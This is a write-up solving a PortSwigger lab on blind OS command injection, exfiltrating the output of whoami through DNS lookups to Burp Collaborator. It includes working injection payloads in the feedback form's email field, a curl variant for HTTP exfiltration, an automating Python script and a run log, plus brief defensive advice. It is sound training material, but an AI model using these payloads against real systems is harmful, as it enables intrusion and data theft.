# Lab: Blind OS command injection with out-of-band data exfiltration (Practitioner)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

**Description:** Same fully blind, asynchronous command injection in the feedback function — but now the command output must be stolen.

**Goal:** Execute `whoami` and exfiltrate the output via a DNS query to Burp Collaborator, then submit the username.

**Vulnerable parameter:** `email` in `POST /feedback/submit`; answer submitted to `POST /submitSolution` (`answer=<user>`).

> As in lab 04, only Burp Collaborator's default public server is reachable from the lab (`*.oastify.com` / `*.burpcollaborator.net`).

## Vulnerability

Blind injection + an outbound DNS channel. Shell command substitution runs `whoami` **inside** the injected command and prepends the result as a DNS label, so the data leaves the network inside the lookup itself:

```
<whoami-output>.<payload-id>.oastify.com
```

The authoritative DNS server for the Collaborator domain logs the full queried name — that is the exfiltration channel.

## Solution

1. Generate a Collaborator payload (Burp's Collaborator tab, or `python3 collaborator_client.py`).
2. Open `/feedback`, take the `csrf` token.
3. Submit feedback with backticks around `whoami`:

```http
POST /feedback/submit HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=x&email=||nslookup+`whoami`.COLLABORATOR-SUBDOMAIN||&subject=x&message=x
```

4. Poll Collaborator. The DNS interaction's `subDomain` contains the username as the left-most label, e.g.:

```
peter-mxB3gd.<payload-id>.oastify.com
```

5. Click **Submit solution** in the lab banner and enter the username. Equivalent request:

```http
POST /submitSolution HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

answer=peter-mxB3gd
```

Response `{"correct":true}` → lab solved.

## Exploit Payload

```
||nslookup `whoami`.COLLABORATOR-SUBDOMAIN||
```

`$(whoami)` works as well:

```
||nslookup $(whoami).COLLABORATOR-SUBDOMAIN||
```

## Python one-liner (optional)

```python
import re, requests
from collaborator_client import Collaborator
base = "https://YOUR-LAB-ID.web-security-academy.net"
c = Collaborator(); payload = c.payload()
s = requests.Session()
csrf = re.search(r'name="csrf" value="([^"]+)"', s.get(base + "/feedback").text).group(1)
s.post(base + "/feedback/submit", data={"csrf": csrf, "name": "x",
       "email": f"||nslookup `whoami`.{payload}||", "subject": "x", "message": "x"})
for i in c.poll():
    print(i["data"]["subDomain"])          # <user>.<payload-id>.oastify.com
```

Full automation (exfiltrate + submit the answer): [`os_command_injection_blind_oob_data_exfiltration.py`](os_command_injection_blind_oob_data_exfiltration.py).

## Verified run

Instance `0a5400870399499f81ab2ae0002500aa`, payload `m7ud3lgbok8jyqyg44llyhtzmqsgg5.oastify.com`:

```
DNS interaction: peter-mxB3gd.m7ud3lgbok8jyqyg44llyhtzmqsgg5.oastify.com
POST /submitSolution answer=peter-mxB3gd -> {"correct":true}
```

## Notes

- DNS labels are limited to 63 characters and the whole name to 253 — for longer output chunk it, e.g. `` `whoami|cut -c1-30` ``, or exfiltrate over HTTP instead: `` ||curl http://COLLABORATOR-SUBDOMAIN/`whoami`|| ``.
- Backticks/`$()` are evaluated by the *target's* shell; keep them out of URL-encoding mistakes (`+` or `%20` for spaces).
- Two DNS interactions usually arrive (A + AAAA / retry) — deduplicate when parsing.
- Confirmed on this instance: `/var/www/images/` is **not** writable and `/image?filename=` is **not** path-traversable, so lab 03's redirection trick does not work here. OAST is the only channel.

## Defensive takeaways

Outbound DNS from application servers should go through a monitored, allow-listed resolver; unexpected high-entropy subdomains are a strong exfiltration signal. And again: eliminate shell invocation with untrusted input — output filtering does nothing against a channel that never touches the HTTP response.
